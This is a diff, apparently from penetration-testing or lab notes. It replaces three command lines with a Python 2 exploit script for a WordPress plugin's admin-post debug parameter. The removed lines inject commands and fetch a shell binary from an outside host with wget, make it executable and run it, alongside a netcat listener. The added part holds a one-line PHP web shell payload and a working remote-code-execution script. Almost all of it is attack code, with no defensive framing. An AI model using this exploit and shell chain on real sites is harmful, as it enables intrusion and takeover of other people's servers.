@@ -1,3 +1,48 @@
-python exploit.py -t http://192.168.55.78/wordpress/ --payload-uri "http://192.168.49.55/payload.txt%26cmd=id"
-nc -lvp 8000
-python exploit.py -t http://192.168.55.78/wordpress/ --payload-uri "http://192.168.49.55/payload.txt%26cmd=wget%20http://192.168.49.55/shell%20-O%20/tmp/shell%20%26%26%20chmod%20777%20/tmp/shell%20%26%26%20/tmp/shell"
+<pre>system($_REQUEST['cmd'])</pre>
+
+import sys
+import requests
+import re
+import urlparse
+import optparse
+
+class EXPLOIT:
+    VULNPATH = "wp-admin/admin-post.php?swp_debug=load_options&swp_url=%s"
+
+    def __init__(self, _t, _p):
+        self.target  = _t
+        self.payload = _p
+
+    def engage(self):
+        uri = urlparse.urljoin( self.target, self.VULNPATH % self.payload )
+        r = requests.get( uri )
+        if r.status_code == 500:
+            print "[*] Received Response From Server!"
+            rr  = r.text
+            obj = re.search(r"^(.*)<\!DOCTYPE", r.text.replace( "\n", "lnbreak" ))
+            if obj:
+                resp = obj.groups()[0]
+                if resp:
+                    print "[<] Received: "
+                    print resp.replace( "lnbreak", "\n" )
+                else:
+                    sys.exit("[<] Nothing Received for the given payload. Seems like the server is not vulnerable!")
+            else:
+                sys.exit("[<] Nothing Received for the given payload. Seems like the server is not vulnerable!")
+        else:
+            sys.exit( "[~] Unexpected Status Received!" )
+
+def main():
+    parser = optparse.OptionParser(  )
+
+    parser.add_option( '-t', '--target', dest="target", default="", type="string", help="Target Link" )
+    parser.add_option( ''  , '--payload-uri', dest="payload", default="", type="string", help="URI where the file payload.txt is located." )
+
+    (options, args) = parser.parse_args()
+
+    print "[>] Sending Payload to System!"
+    exploit = EXPLOIT( options.target, options.payload )
+    exploit.engage()
+
+if __name__ == "__main__":
+    main()
